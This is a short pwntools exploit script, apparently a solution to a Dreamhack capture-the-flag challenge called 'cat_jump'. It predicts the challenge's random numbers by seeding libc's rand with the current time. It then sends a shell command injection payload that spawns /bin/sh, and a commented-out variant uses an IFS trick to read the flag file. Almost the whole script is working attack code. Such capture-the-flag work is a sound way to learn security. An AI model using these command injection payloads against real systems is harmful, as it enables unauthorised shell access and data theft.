from pwn import *
from ctypes import CDLL

r = process("./cat_jump")
#r = remote("host3.dreamhack.games", 15661)

context.log_level = "debug"

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(libc.time(0x00))

r.recvuntil(b"let the cat reach the roof!")
sleep(1)

for i in range(0, 37):
    rand = libc.rand() % 2

    if rand == 0:
        r.sendlineafter(b"left jump='h', right jump='j': ", b'l')
    else: 
        r.sendlineafter(b"left jump='h', right jump='j': ", b'h')

    libc.rand()

r.sendlineafter(b":", b"asdf\";/bin/sh;echo\"") # Using Shell command injection
#r.sendlineafter(b":", b"$(cat${IFS}flag)) # Using Command Injection via IFS (Internal Field Seperator)
r.interactive()
